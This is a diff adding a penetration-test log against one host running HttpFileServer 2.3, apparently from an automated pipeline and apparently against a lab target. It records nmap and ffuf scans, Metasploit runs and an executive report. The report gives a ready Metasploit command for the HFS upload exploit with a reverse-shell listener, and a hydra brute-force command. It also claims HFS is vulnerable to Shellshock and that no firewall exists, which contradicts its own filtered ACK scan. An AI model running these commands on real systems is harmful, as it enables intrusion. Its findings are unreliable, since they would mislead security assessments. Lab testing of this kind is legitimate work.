@@ -1,0 +1,223 @@
+PENTEST LOG — 10.129.10.49
+Date: 2026-06-04T23:27:05.765120
+============================================================
+
+[Step 1] Full TCP SYN scan (all 65535 ports)
+  Cmd: nmap -Pn -sS -p- --min-rate 1000 --max-retries 2 10.129.10.49
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-04 23:28 +0200
+Nmap scan report for 10.129.10.49
+Host is up (0.036s latency).
+Not shown: 65534 filtered tcp ports (no-response)
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 114.96 seconds
+
+----------------------------------------
+[Step 2] Version + OS detection on 80
+  Cmd: nmap -Pn -sV -O --version-intensity 5 -sC --script-timeout 60s -p 80 -oX /home/marina/Desktop/pentestM/RAG/outputs/nmap_sV_10_129_10_49.xml 10.129.10.49
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-04 23:30 +0200
+Nmap scan report for 10.129.10.49
+Host is up (0.036s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    HttpFileServer httpd 2.3
+|_http-title: HFS /
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2012|2008|7 (97%)
+OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
+Aggressive OS guesses: Microsoft Windows Server 2012 R2 (97%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.02 seconds
+
+----------------------------------------
+[Step 3] Check for Shellshock Vulnerability
+  Cmd: nmap -Pn -sV --script http-shellshock -p 80 10.129.10.49 --script-timeout 30s
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-04 23:31 +0200
+Nmap scan report for 10.129.10.49
+Host is up (0.036s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    HttpFileServer httpd 2.3
+|_http-server-header: HFS 2.3
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.15 seconds
+
+----------------------------------------
+[Step 4] Check for Authentication Methods
+  Cmd: nmap -Pn -sV --script http-auth-finder -p 80 10.129.10.49 --script-timeout 30s
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-04 23:32 +0200
+Nmap scan report for 10.129.10.49
+Host is up (0.036s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    HttpFileServer httpd 2.3
+| http-auth-finder: 
+| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.10.49
+|   url                            method
+|_  http://10.129.10.49:80/~login  HTTP: Basic
+|_http-server-header: HFS 2.3
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.44 seconds
+
+----------------------------------------
+[Step 5] Check Web Page Title
+  Cmd: nmap -Pn -sV --script http-title -p 80 10.129.10.49 --script-timeout 30s
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-04 23:32 +0200
+Nmap scan report for 10.129.10.49
+Host is up (0.036s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    HttpFileServer httpd 2.3
+|_http-server-header: HFS 2.3
+|_http-title: HFS /
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.26 seconds
+
+----------------------------------------
+[Step 6] ACK scan — firewall detection
+  Cmd: nmap -Pn -sA -p 80 10.129.10.49
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-04 23:33 +0200
+Nmap scan report for 10.129.10.49
+Host is up.
+
+PORT   STATE    SERVICE
+80/tcp filtered http
+
+Nmap done: 1 IP address (1 host up) scanned in 2.60 seconds
+
+----------------------------------------
+[Step 7] UDP scan — top 100 ports by frequency
+  Cmd: nmap -Pn -sU --top-ports 100 --open --max-retries 1 10.129.10.49
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-04 23:33 +0200
+Nmap scan report for 10.129.10.49
+Host is up.
+All 100 scanned ports on 10.129.10.49 are in ignored states.
+Not shown: 100 open|filtered udp ports (no-response)
+
+Nmap done: 1 IP address (1 host up) scanned in 21.70 seconds
+
+----------------------------------------
+[Step 8] UDP scan — exploit-focused service ports
+  Cmd: nmap -Pn -sU -p 53,67,69,111,123,137,138,161,162,500,623,1434,1900,4500,5353,11211,17185 --open --max-retries 1 10.129.10.49
+  OK: True
+  Out:
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-04 23:33 +0200
+Nmap scan report for 10.129.10.49
+Host is up.
+
+PORT      STATE         SERVICE
+53/udp    open|filtered domain
+67/udp    open|filtered dhcps
+69/udp    open|filtered tftp
+111/udp   open|filtered rpcbind
+123/udp   open|filtered ntp
+137/udp   open|filtered netbios-ns
+138/udp   open|filtered netbios-dgm
+161/udp   open|filtered snmp
+162/udp   open|filtered snmptrap
+500/udp   open|filtered isakmp
+623/udp   open|filtered asf-rmcp
+1434/udp  open|filtered ms-sql-m
+1900/udp  open|filtered upnp
+4500/udp  open|filtered nat-t-ike
+5353/udp  open|filtered zeroconf
+11211/udp open|filtered memcache
+17185/udp open|filtered wdbrpc
+
+Nmap done: 1 IP address (1 host up) scanned in 5.68 seconds
+
+----------------------------------------
+[Step 9] ffuf — http://10.129.10.49
+  Cmd: ffuf -u http://10.129.10.49/FUZZ -w /usr/share/dirb/wordlists/common.txt -t 40 -v -timeout 10 -e php,html,txt,js,json,bak,old,zip -o /tmp/ffuf_output_1780608850.json -of json -fs 2340
+  OK: True
+  Out:
+[200] http://10.129.10.49/
+[200] http://10.129.10.49/favicon.ico
+----------------------------------------
+[Step 10] ffuf vhosts — FUZZ.10.129.10.49
+  Cmd: ffuf -u http://10.129.10.49 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 40 -H 'Host: FUZZ.10.129.10.49' -o /tmp/ffuf_vhost_80_1780609217.json -of json -v -ac
+  OK: True
+  Out:
+
+----------------------------------------
+[Step 11] MSF exploitation phase
+  Cmd: msfconsole (multiple modules)
+  OK: True
+  Out:
+2 modules executed
+----------------------------------------
+[Step 11] Searchsploit + credential phase
+  Cmd: searchsploit / paramiko / ftplib
+  OK: False
+  Out:
+0 exploits tried, 0 shells, 0 creds
+----------------------------------------
+
+============================================================
+EXECUTIVE REPORT:
+## Attack Surface Summary  
+The attack surface is **HIGH** due to the presence of HttpFileServer (HFS) on port 80. HFS is known to be insecure and has been associated with vulnerabilities, including potential Shellshock compatibility issues. Additionally, basic authentication was detected, which may be vulnerable to brute-force or credential stuffing attacks if not properly secured.  
+
+---
+
+## Detected Services and Versions  
+- **Port 80**: HttpFileServer (HFS) httpd 2.3  
+
+---
+
+## Key Findings  
+- HttpFileServer (HFS) is a known insecure web server often used for internal file sharing and may pose a risk if exposed to the internet.  
+- HFS is associated with vulnerabilities, including potential Shellshock compatibility issues.  
+- Basic authentication was detected on port 80 at `http://10.129.10.49:80/~login`.  
+- The service is running on a **Windows** operating system.  
+- No firewall was detected, which increases the risk of exploitation.  
+
+---
+
+## Recommended Next Steps  
+1. **Exploit HFS Vulnerabilities**:  
+   - Use Metasploit module `exploit/windows/http/hfs_file_upload_exec` to exploit HFS if it allows file upload or execution.  
+   - Command: `msfconsole -x "use exploit/windows/http/hfs_file_upload_exec; set RHOSTS 10.129.10.49; set LHOST <your_ip>; exploit"`  
+
+2. **Check for Shellshock Vulnerability**:  
+   - Since HFS is known to be vulnerable to Shellshock, test for this using the `http-shellshock` script.  
+   - Command: `nmap --script http-shellshock -p 80 10.129.10.49`  
+
+3. **Brute-force Basic Authentication**:  
+   - Use `hydra` or `metasploit` to attempt brute-force attacks on the basic authentication endpoint (`http://10.129.10.49:80/~login`).  
+   - Example command: `hydra -l admin -P /path/to/wordlist.txt -s 80 10.129.10.49 http-basic`  
+
+4. **Verify for Known Exploits**:  
+   - Check for known CVEs related to HFS. While no specific CVE was provided, HFS is known to have multiple vulnerabilities.  
+   - Example CVE: CVE-2014-6271 (Shellshock) — test if HFS is vulnerable to this.  
+
+5. **Ensure No Windows-Specific Exploits Are Used**:  
+   - Since the OS is Windows, avoid using Linux-specific exploits (e.g., `exploit/multi/samba/*`). Use only Windows-specific modules or cross-platform exploits.  
+
+6. **Verify Firewall Rules**:  
+   - Since no firewall was detected, ensure that the system is properly configured with a firewall to restrict access to port 80.
